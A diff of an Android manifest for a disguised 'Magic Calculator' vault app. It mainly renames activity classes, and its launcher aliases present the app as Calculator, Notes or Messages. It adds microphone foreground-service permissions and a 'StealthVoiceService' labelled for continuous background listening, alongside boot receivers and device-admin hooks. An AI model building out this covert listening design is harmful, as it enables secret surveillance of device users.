@@ -19,6 +19,10 @@
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <!-- ── UPI Intent Queries (Required on Android 11+ for PhonePe, GPay, Paytm) ── -->
     <queries>
@@ -48,7 +52,7 @@
              SPLASH ACTIVITY — Target for Launcher Aliases
              ══════════════════════════════════════════════════════════ -->
         <activity
-            android:name=".SplashActivity"
+            android:name="com.magic.calculator.feature.splash.presentation.SplashActivity"
             android:exported="true"
             android:screenOrientation="portrait"
             android:theme="@style/Theme.MagicCalculator" />
@@ -60,7 +64,7 @@
             android:exported="true"
             android:icon="@drawable/ic_app_icon_calculator"
             android:label="Calculator"
-            android:targetActivity=".SplashActivity">
+            android:targetActivity="com.magic.calculator.feature.splash.presentation.SplashActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -74,7 +78,7 @@
             android:exported="true"
             android:icon="@drawable/ic_app_icon_calendar"
             android:label="Calendar"
-            android:targetActivity=".SplashActivity">
+            android:targetActivity="com.magic.calculator.feature.splash.presentation.SplashActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -88,7 +92,7 @@
             android:exported="true"
             android:icon="@drawable/ic_app_icon_notes"
             android:label="Notes"
-            android:targetActivity=".SplashActivity">
+            android:targetActivity="com.magic.calculator.feature.splash.presentation.SplashActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -102,7 +106,7 @@
             android:exported="true"
             android:icon="@drawable/ic_app_icon_settings"
             android:label="Settings"
-            android:targetActivity=".SplashActivity">
+            android:targetActivity="com.magic.calculator.feature.splash.presentation.SplashActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -116,7 +120,7 @@
             android:exported="true"
             android:icon="@drawable/ic_app_icon_messages"
             android:label="Messages"
-            android:targetActivity=".SplashActivity">
+            android:targetActivity="com.magic.calculator.feature.splash.presentation.SplashActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -124,13 +128,13 @@
         </activity-alias>
 
         <activity
-            android:name=".LoginActivity"
+            android:name="com.magic.calculator.feature.auth.presentation.LoginActivity"
             android:exported="false"
             android:screenOrientation="portrait"
             android:windowSoftInputMode="adjustResize" />
 
         <activity
-            android:name=".SignupActivity"
+            android:name="com.magic.calculator.feature.auth.presentation.SignupActivity"
             android:exported="false"
             android:screenOrientation="portrait"
             android:windowSoftInputMode="adjustResize" />
@@ -148,19 +152,19 @@
              PREMIUM ACTIVITY — paywall screen (was MISSING — now added)
              ══════════════════════════════════════════════════════════ -->
         <activity
-            android:name=".PremiumActivity"
+            android:name="com.magic.calculator.feature.subscription.presentation.PremiumActivity"
             android:exported="false"
             android:screenOrientation="portrait"
             android:theme="@style/Theme.MagicCalculator" />
 
         <activity
-            android:name=".ui.payment.PaymentHistoryActivity"
+            android:name="com.magic.calculator.feature.subscription.presentation.PaymentHistoryActivity"
             android:exported="false"
             android:screenOrientation="portrait"
             android:theme="@style/Theme.MagicCalculator" />
 
         <activity
-            android:name=".SettingsActivity"
+            android:name="com.magic.calculator.feature.settings.presentation.SettingsActivity"
             android:exported="false"
             android:screenOrientation="portrait" />
 
@@ -170,21 +174,21 @@
             android:screenOrientation="portrait" />
 
         <activity
-            android:name=".CallingActivity"
+            android:name="com.magic.calculator.feature.dialer.presentation.CallingActivity"
             android:exported="false"
             android:screenOrientation="portrait" />
 
         <activity
-            android:name=".ui.GalleryActivity"
+            android:name="com.magic.calculator.feature.vault.presentation.GalleryActivity"
             android:exported="false"
             android:screenOrientation="portrait" />
 
         <activity
-            android:name=".ui.PhotoViewerActivity"
+            android:name="com.magic.calculator.feature.vault.presentation.PhotoViewerActivity"
             android:screenOrientation="portrait" />
 
         <activity
-            android:name=".ui.moilock.MoiLockActivity"
+            android:name="com.magic.calculator.feature.applock.presentation.MoiLockActivity"
             android:screenOrientation="portrait"
             android:showWhenLocked="true"
             android:turnScreenOn="true"
@@ -192,18 +196,24 @@
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
         <activity
-            android:name=".ui.moilock.MoiLockSetupActivity"
+            android:name="com.magic.calculator.feature.applock.presentation.MoiLockSetupActivity"
             android:screenOrientation="portrait"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
         <activity
-            android:name=".ui.moilock.MoiLockUnlockActivity"
+            android:name="com.magic.calculator.feature.applock.presentation.MoiLockUnlockActivity"
             android:screenOrientation="portrait"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
+        <!-- Stealth Voice Foreground Service for continuous background listening -->
+        <service
+            android:name="com.magic.calculator.feature.voice_wallpaper.data.voice.StealthVoiceService"
+            android:exported="false"
+            android:foregroundServiceType="microphone|mediaPlayback" />
+
         <!-- MoiLock Services & Receivers -->
         <service
-            android:name=".ui.moilock.MoiLockService"
+            android:name="com.magic.calculator.feature.applock.presentation.service.MoiLockService"
             android:foregroundServiceType="specialUse">
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
@@ -211,7 +221,7 @@
         </service>
 
         <receiver
-            android:name=".ui.moilock.MoiDeviceAdminReceiver"
+            android:name="com.magic.calculator.feature.applock.presentation.receiver.MoiDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
             <meta-data
@@ -223,7 +233,7 @@
         </receiver>
 
         <receiver
-            android:name=".ui.moilock.ScreenReceiver"
+            android:name="com.magic.calculator.feature.applock.presentation.receiver.ScreenReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
@@ -231,7 +241,7 @@
         </receiver>
 
         <receiver
-            android:name=".ui.moilock.MoiBootReceiver"
+            android:name="com.magic.calculator.feature.applock.presentation.receiver.MoiBootReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
